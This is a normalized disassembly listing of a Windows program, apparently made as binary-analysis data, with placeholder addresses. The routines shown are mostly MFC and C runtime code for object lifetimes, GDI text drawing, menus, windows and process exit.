call sub_4073d0
mov ecx [ esi ]
mov [ eax ] ecx
mov [ esi ] edi
pop edi
pop esi
retn 0x4
sub_4076e6
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
j_sub_407786
jmp sub_407786
sub_4077a9
mov eax [ rw-data ]
test eax eax
je r-xdata
retn 0x4
jmp eax
sub_4077b7
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn 0x8
jmp eax
sub_4077c7
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn 0x8
jmp eax
sub_407807
mov eax ecx
xor edx edx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x34 ] edx
mov [ eax + 0x54 ] edx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x50 ] edx
retn
sub_407901
push esi
mov esi ecx
call sub_407820
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
sub_40791c
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
or [ eax + 0x44 ] 0xffffffff
or [ eax + 0x4c ] 0xffffffff
mov [ eax + 0x48 ] ecx
mov [ eax + 0xc ] 0x6c
mov [ eax + 0x28 ] j_sub_4054cf
retn
sub_407946
push esi
mov esi ecx
call sub_407855
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
sub_407961
push 0x54
call sub_4072e4
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_40791c
sub_407976
push sub_405503
mov ecx rw-data
call sub_4076fc
test eax eax
jne r-xdata
retn
jmp sub_4054e9
sub_407a32
push sub_407961
call sub_4076fc
test eax eax
jne r-xdata
retn
jmp sub_4054e9
sub_407a46
push esi
push [ esp + 0x8 ]
mov esi ecx
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_406a32
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x4
sub_407a69
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx 0x10
pop esi
jmp sub_4056ce
push [ esi + 0x4 ]
call [ FreeLibrary@IAT ]
sub_407d34
push esi
mov esi ecx
call sub_407a69
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
sub_407dc3
mov ecx [ ebp - 0x18 ]
call sub_40540f
mov eax r-xdata
retn
sub_407e4d
push esi
push 0x1
mov esi ecx
call sub_407d4f
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_407e61
push esi
mov esi ecx
call sub_40798f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
sub_407ede
call sub_407eab
mov ecx eax
add ecx 0x74
call sub_407a32
test eax eax
jne r-xdata
retn
jmp sub_4054e9
sub_4081be
mov eax r--data
retn
sub_4082be
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_407f2a
push eax
call sub_408278
sub_4082df
mov eax rw-data
retn
sub_408320
push [ esp + 0x4 ]
call sub_40f613
pop ecx
retn 0x4
sub_40835c
mov eax ecx
retn
sub_40835f
mov eax ecx
mov [ eax ] r--data
xor ecx ecx
mov [ eax + 0x10 ] 0x2
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x4 ] eax
retn
sub_408382
xor edx edx
lea eax [ ecx + 0x10 ]
inc edx
[ eax ] edx
lea eax [ ecx + 0x4 ]
retn
sub_4084dc
push 0x10
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4112cb
add esp 0xc
neg eax
sbb eax eax
inc eax
retn
sub_4084f4
cmp [ ecx + 0x4 ] 0x0
je r-xdata
retn
push [ ecx ]
push 0x0
call sub_4077c7
sub_408504
cmp [ ecx + 0x8 ] 0x0
je r-xdata
add ecx 0x4
push ecx
call [ InterlockedIncrement@IAT ]
retn
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
retn
sub_408575
cmp [ ecx + 0x8 ] 0x0
je r-xdata
jmp sub_40851f
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
retn
sub_4085ca
cmp [ ecx + 0x8 ] 0x0
je r-xdata
jmp sub_40858a
push [ esp + 0x8 ]
mov eax [ ecx + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx ]
retn 0x8
sub_4086db
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
push rw-data
mov [ rw-data ] 0x1
call [ InitializeCriticalSection@IAT ]
sub_40876c
mov eax [ esp + 0x4 ]
cmp eax 0x11
jb r-xdata
imul eax eax 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
retn 0x4
call sub_4054e9
sub_40878c
call sub_407ede
mov eax [ eax + 0x4 ]
retn
sub_4087ba
call sub_407ede
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
jmp sub_408795
mov eax [ ecx ]
jmp [ eax + 0x6c ]
sub_408855
mov edx [ ecx + 0x10 ]
mov eax [ esp + 0x4 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_40882a
sub_4089a4
mov eax r--data
retn
sub_408a86
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40882a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_408ac8
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
call sub_4054e9
retn 0x4
call sub_408aa8
sub_408cb4
push 0x1
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_408c5d
retn 0xc
sub_408ccb
xor eax eax
cmp [ esp + 0x4 ] eax
setne al
retn 0x8
sub_408cd7
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_41096b
push eax
call sub_401000
add esp 0x14
retn
sub_4091a1
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_408cf6
cmp eax [ esp + 0x8 ]
je r-xdata
retn 0x8
push 0x0
push 0x3
call sub_4092e9
sub_4091c0
mov eax r--data
retn
sub_40926d
mov eax r-xdata
retn
sub_40932c
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_409336
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_409340
and [ ecx + 0x8 ] 0x0
retn
sub_409345
and [ ecx + 0x4 ] 0x0
retn
sub_409445
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_409455
mov eax r--data
retn
sub_40945b
mov eax r--data
retn
sub_409461
mov eax r--data
retn
sub_409467
mov eax r--data
retn
sub_40946d
push [ esp + 0x4 ]
call j_sub_40f613
pop ecx
retn 0x8
sub_40948e
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_4094a2
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_4094b2
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_40952b
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_409547
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ DrawTextExA@IAT ]
pop ebp
retn 0x14
sub_409596
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_409759
push 0x8
call sub_4053df
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_409773
mov eax [ esp + 0x4 ]
xor ecx ecx
cmp eax ecx
je r-xdata
retn 0x4
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
sub_40978f
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x4
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
sub_4097a4
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_4097c1
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_409891
cmp [ ecx + 0x4 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
call sub_409860
push eax
call [ DeleteDC@IAT ]
sub_40991e
push 0x1
call sub_4098aa
mov ecx eax
jmp sub_40ed95
sub_409956
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_40992c
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_40996c
push esi
mov esi ecx
call sub_409891
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_409a0a
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409956
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40a33b
retn
sub_40a33c
cmp [ ecx + 0x20 ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0x114 ]
jmp [ eax + 0x60 ]
sub_40a394
lea eax [ ecx + 0x40 ]
retn
sub_40a398
push esi
mov esi ecx
call sub_407eab
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_40a4aa
push esi
mov esi ecx
call sub_40e999
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_40a4c3
mov eax [ esp + 0x4 ]
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x18 ] 0x1
retn 0x4
sub_40a501
mov eax r--data
retn
sub_40a507
push ebp
mov ebp esp
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40a295
pop ebp
retn 0x18
sub_40a522
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40a53c
mov eax 0x80004001
retn 0x10
sub_40a544
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
mov eax 0x80004001
mov eax 0x80004003
jmp r-xdata
retn 0x8
sub_40a55e
lea eax [ ecx + 0x28 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
push eax
push r--data
push 0xfffffffc
push [ ecx + 0x20 ]
call CreateStdAccessibleObject
test eax eax
jl r-xdata
retn
sub_40a57d
mov eax [ ecx + 0x28 ]
push [ esp + 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
retn 0x4
sub_40a58d
mov eax [ ecx + 0x28 ]
push [ esp + 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x20 ]
retn 0x4
sub_40a6ca
mov eax [ ecx + 0x28 ]
push [ esp + 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
retn 0x4
sub_40a6da
mov eax [ ecx + 0x28 ]
push [ esp + 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
retn 0x4
sub_40a77d
push [ esp + 0xc ]
mov eax [ ecx + 0x28 ]
push [ esp + 0xc ]
mov ecx [ eax ]
push [ esp + 0xc ]
push eax
call [ ecx + 0x60 ]
retn 0xc
sub_40a7d3
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
xor eax eax
retn 0x4
sub_40a7df
mov eax [ ecx + 0x3c ]
and eax 0x10
retn
sub_40a7e6
xor eax eax
retn
sub_40a7e9
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
xor eax eax
inc eax
retn 0x4
call sub_4054e9
sub_40a7ff
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
xor eax eax
inc eax
retn 0x10
call sub_4054e9
sub_40a815
mov eax r--data
retn
sub_40aa85
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_40f2f6
retn 0x4
sub_40aa9b
push 0x0
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_40aaa7
push 0x1
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_40aab3
push 0xffffffff
push [ esp + 0xc ]
push 0xffffffff
push [ esp + 0x10 ]
push 0x1
push 0x409
call [ CompareStringA@IAT ]
dec eax
dec eax
retn
sub_40ab5b
push esi
push [ esp + 0xc ]
mov esi [ esp + 0xc ]
push [ esi + 0x20 ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_40ef1c
mov ecx [ esp + 0x10 ]
mov [ ecx ] eax
pop esi
retn 0xc
sub_40acd2
mov [ ecx ] r--data
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
push ecx
call [ FreeLibrary@IAT ]
sub_40ace7
push esi
mov esi ecx
call sub_40acd2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4072fc
sub_40ad53
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_407ede
mov eax [ eax + 0x48 ]
test eax eax
je r-xdata
test [ eax + 0x4 ] 0x40000000
jne r-xdata
push 0x1
call sub_40ac15
sub_40b75a
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40b97b
push 0x4
mov eax sub_420f64
call sub_41021d
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
call sub_4102bc
retn 0x4
call sub_40ab18
sub_40ba61
cmp [ ebp - 0x20 ] 0x2
je r-xdata
retn
push [ ebp - 0x1c ]
push 0x0
call sub_4077c7
sub_40bb47
push [ esp + 0x4 ]
call sub_407eab
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40ba9c
retn 0x4
j_sub_40aafe
jmp sub_40aafe
sub_40bc6b
push 0x0
call sub_40bbd0
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
add ecx 0x1c
jmp sub_4088a6
sub_40c184
push 0xc
call sub_4072e4
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_40c2c9
mov eax [ ebp - 0x14 ]
add eax 0x58
push eax
push [ ebp - 0x18 ]
call sub_4087ba
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x18 ] eax
call sub_40540f
mov eax r-xdata
retn
sub_40ca5b
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
neg eax
sbb eax eax
and eax 0xffff3ef9
add eax 0x80010108
retn 0x18
sub_40ca73
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x8 ] ecx
xor eax eax
retn 0xc
sub_40caf1
mov eax [ esp + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0x8 ]
push [ esp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
mov eax 0x80010108
jmp r-xdata
retn 0x8
sub_40cb3b
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push eax
call sub_40bc44
retn
push [ ecx + 0x20 ]
call [ GetParent@IAT ]
sub_40cb52
push esi
mov esi ecx
call sub_40c34d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40cbd5
mov eax [ esp + 0x8 ]
push esi
push 0x0
push [ eax + 0xc ]
mov esi ecx
call sub_40c4ef
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_40bba0
sub_40cf2e
xor eax eax
retn 0x8
sub_40cf33
mov eax 0x80004001
retn 0x8
sub_40cf3b
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ ecx + 0xc ]
mov ecx [ eax ]
push 0x0
push eax
call [ ecx + 0xc ]
retn
xor eax eax
retn
sub_40d01c
mov [ ecx ] r--data
mov [ ecx + 0x4 ] r--data
mov [ ecx + 0x10 ] r--data
mov [ ecx + 0x14 ] 0xc0000001
call sub_40cf3b
jmp sub_40f4b5
sub_40d041
mov eax [ esp + 0x4 ]
inc [ eax + 0x14 ]
mov eax [ eax + 0x14 ]
retn 0x4
sub_40d06c
push [ esp + 0xc ]
push [ esp + 0xc ]
push r--data
push [ esp + 0x10 ]
call sub_40cf7b
retn 0xc
sub_40d085
push esi
mov esi ecx
call sub_40d01c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40d0a1
sub [ esp + 0x4 ] 0x10
jmp sub_40d04e
sub_40d0ab
sub [ esp + 0x4 ] 0x10
jmp sub_40d041
sub_40d0b5
sub [ esp + 0x4 ] 0x4
jmp sub_40d06c
sub_40d0bf
sub [ esp + 0x4 ] 0x4
jmp sub_40d04e
sub_40d0c9
sub [ esp + 0x4 ] 0x4
jmp sub_40d041
sub_40d0d3
sub [ esp + 0x4 ] 0x10
jmp sub_40d06c
sub_40de94
mov ecx [ ebp - 0x20 ]
call sub_40540f
mov eax r-xdata
retn
sub_40e1a0
mov eax r--data
retn
sub_40e223
push 0x1
call sub_40876c
push 0x0
push 0x0
call sub_40fe0c
int3
sub_40e548
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop esi
retn 0x4
push 0x1
call sub_40e275
mov [ esi + 0x28 ] r--data
sub_40e964
xor eax eax
inc eax
retn 0x4
sub_40e96a
mov eax 0x80029c4a
retn 0x8
sub_40e972
mov eax r--data
retn
sub_40e978
mov eax r--data
retn
sub_40e97e
mov eax r--data
retn
sub_40e984
xor eax eax
inc eax
retn
sub_40e988
mov eax r--data
retn
sub_40e98e
xor eax eax
retn 0x4
sub_40e993
mov eax r--data
retn
sub_40e9bf
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ ModifyMenuA@IAT ]
retn 0x10
sub_40ea01
push esi
mov esi ecx
lea ecx [ esi + 0x10 ]
mov eax [ ecx ]
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
pop esi
retn
call [ eax + 0x1c ]
sub_40ea16
call sub_407eab
mov eax [ eax + 0x4 ]
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx + 0x9c ]
retn
sub_40ea2b
call sub_407eab
mov eax [ eax + 0x4 ]
mov edx [ eax ]
push 0xffffffff
mov ecx eax
call [ edx + 0x9c ]
retn
sub_40ee36
push [ ebp + 0x8 ]
call sub_4053cd
push 0x0
push 0x0
call sub_40fe0c
int3
sub_40eef8
push esi
mov esi ecx
call sub_40eeab
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40ef14
mov ecx [ ecx + 0x4c ]
mov eax [ ecx ]
jmp [ eax + 0x58 ]
sub_40ef1c
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0x78 ]
push 0xfffffff0
push [ ecx + 0x20 ]
call [ GetWindowLongA@IAT ]
retn
sub_40ef36
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0x7c ]
push 0xffffffec
push [ ecx + 0x20 ]
call [ GetWindowLongA@IAT ]
retn
sub_40ef50
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0xa4 ]
push [ ecx + 0x20 ]
call [ IsWindowEnabled@IAT ]
retn
sub_40ef6b
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn 0x4
sub_40f03a
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call j_sub_40f613
test esi esi
pop ecx
mov ecx esi
jne r-xdata
pop esi
sub_40f050
mov eax rw-data
retn
sub_40f056
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_40f06d
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call j_sub_40f613
pop ecx
retn
sub_40f20a
push 0x14
call sub_4053df
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_40f056
sub_40f220
push esi
mov esi ecx
call sub_40f06d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40f23c
retn 0x4
sub_40f23f
mov eax r--data
retn
sub_40f245
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
push 0x0
call [ eax + 0x4 ]
retn 0x4
sub_40f253
push 0x8
call sub_4053df
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_40f26d
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x4
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
sub_40f2f6
push 0x1
call sub_40f282
mov ecx eax
jmp sub_40ed95
sub_40f304
push 0x0
call sub_40f282
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
add ecx 0x1c
jmp sub_4088a6
sub_40f348
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_40f31e
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_40f35e
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40f348
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40f380
call sub_40878c
test eax eax
je r-xdata
jmp [ PostQuitMessage@IAT ]
mov eax [ eax + 0x3c ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_40f43a
call sub_407eab
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_40f44a
call sub_407eab
add eax 0x2c
push eax
call [ InterlockedIncrement@IAT ]
retn
sub_40f45a
call sub_407eab
mov ecx [ esp + 0x4 ]
mov [ eax + 0x30 ] ecx
retn 0x4
sub_40f52f
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
call sub_40f03a
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop esi
retn
j_sub_40f52f
jmp sub_40f52f
sub_40f669
push 0x4
call sub_414124
pop ecx
retn
sub_40f79d
push 0x4
call sub_414124
pop ecx
retn
sub_40f805
push 0x4
call sub_414124
pop ecx
retn
j_sub_40f8d1
jmp sub_40f8d1
sub_40fa2b
push 0x4
call sub_414124
pop ecx
retn
sub_40fb49
call sub_41576b
mov ecx [ esp + 0x4 ]
mov [ eax + 0x14 ] ecx
retn
sub_40fb56
call sub_41576b
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_40fb78
push ecx
mov [ ecx ] r--data
call sub_415a28
pop ecx
retn
sub_40fb86
push esi
mov esi ecx
call sub_40fb78
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40fba2
mov eax [ esp + 0x4 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_415aa0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
retn 0x4
sub_40fdaf
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x2c ] ecx
push eax
push ecx
call sub_415b28
pop ecx
pop ecx
retn
sub_40fde9
xor eax eax
inc eax
retn
_start
call sub_4163dd
jmp sub_40fc22
sub_41012a
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov [ esi ] eax
call sub_41576b
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_41576b
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
retn
sub_4102bc
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4102d0
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f589
jmp sub_4102bc
sub_4102df
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_41728c
add esp 0x14
retn
sub_41040c
call sub_412fd5
retn
sub_410412
push [ esp + 0x4 ]
call sub_4103d6
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_410479
push [ esp + 0x8 ]
push 0x0
push [ esp + 0xc ]
push sub_41350f
call sub_410424
add esp 0x10
retn
sub_4105e1
push [ esp + 0x10 ]
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_41055b
add esp 0x14
retn
sub_410721
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_410cfd
mov eax [ esp + 0x4 ]
push 0x1
call sub_410a4a
pop ecx
retn
sub_410ffc
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_40f589
jmp sub_410721
sub_411026
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_413280
sub_41109d
push esi
call sub_41108a
mov ecx [ esp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41103c
pop ecx
mov esi eax
call sub_411077
mov [ eax ] esi
pop esi
retn
sub_4111f7
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_41113d
add esp 0xc
retn
sub_4129c4
mov eax sub_41a763
mov [ rw-data ] eax
mov [ rw-data ] sub_419e5f
mov [ rw-data ] sub_419e1d
mov [ rw-data ] sub_419e51
mov [ rw-data ] sub_419dc7
mov [ rw-data ] eax
mov [ rw-data ] sub_41a6dd
mov [ rw-data ] sub_419ddd
mov [ rw-data ] sub_419d47
mov [ rw-data ] sub_419cd6
retn
sub_412a24
call sub_4129c4
call sub_41a808
cmp [ esp + 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
retn
call sub_41a7a3
sub_412d06
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_412bea
add esp 0xc
retn
sub_412eb2
push 0x4
call sub_414124
pop ecx
retn
sub_412f64
push 0x4
call sub_414124
pop ecx
retn
sub_412f6d
call sub_414ef8
push [ esp + 0x4 ]
call sub_414d58
push [ rw-data ]
call sub_415561
push 0xff
call eax
add esp 0xc
retn
sub_412f91
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_412fb7
push [ esp + 0x4 ]
call sub_412f91
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_412fcc
push 0x8
call sub_4141fc
pop ecx
retn
sub_412fd5
push 0x8
call sub_414124
pop ecx
retn
sub_4131d4
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_414124
pop ecx
sub_4131e9
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_41311b
add esp 0xc
retn
sub_4131fa
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_41311b
add esp 0xc
retn
sub_41320b
push 0x1
push 0x0
push 0x0
call sub_41311b
add esp 0xc
retn
sub_41321a
push 0x1
push 0x1
push 0x0
call sub_41311b
add esp 0xc
retn
sub_413ea7
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_414124
push ebp
